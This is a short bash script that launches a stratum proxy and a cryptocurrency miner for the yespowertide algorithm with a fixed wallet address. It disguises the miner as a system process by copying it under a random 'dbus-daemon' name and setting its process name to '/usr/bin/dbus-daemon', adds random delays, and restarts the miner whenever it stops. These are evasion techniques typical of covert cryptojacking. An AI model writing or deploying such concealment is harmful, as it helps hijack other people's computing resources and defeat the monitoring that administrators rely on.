#!/bin/bash

PORT=443
FAKE\_NAME="dbus-daemon-$(shuf -i 100-999 -n 1)"
FAKE\_PATH="/usr/local/bin/${FAKE\_NAME}"

echo "Starting Proxy + Miner..."

aiostratum-proxy -c proxy-config.yaml > proxy.log 2>&1 &

sleep 15

cp /usr/local/bin/miner "$FAKE\_PATH"
chmod +x "$FAKE\_PATH"

sleep $((RANDOM % 90 + 30))   # Delay lebih panjang

exec -a "/usr/bin/dbus-daemon" "$FAKE\_PATH" \\
  -a yespowertide \\
  -o stratum+tcps://127.0.0.1:${PORT} \\
  -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \\
  -p x \\
  -t 1 \\
  -B --no-color \> /dev/null 2\>&1 &

echo "Running with long delay..."

while true; do
    sleep $((RANDOM % 120 + 60))
    if ! pgrep -f ${FAKE\_NAME} \> /dev/null 2\>&1; then
        sleep $((RANDOM % 60 + 30))
        exec -a "/usr/bin/dbus-daemon" "$FAKE\_PATH" \\
          -a yespowertide \\
          -o stratum+tcps://127.0.0.1:${PORT} \\
          -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \\
          -p x \\
          -t 1 \\
          -B --no-color \> /dev/null 2\>&1 &
    fi
done
